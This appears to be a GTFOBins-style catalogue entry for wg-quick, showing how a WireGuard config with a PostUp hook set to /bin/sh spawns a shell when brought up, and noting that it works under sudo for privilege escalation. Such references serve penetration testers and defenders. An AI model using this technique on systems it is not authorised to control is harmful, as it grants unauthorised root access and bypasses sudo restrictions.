---
type: gtfobin
name: wg-quick
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# wg-quick

## shell

```bash
cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf
```
_Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again._
**Contexts:** sudo
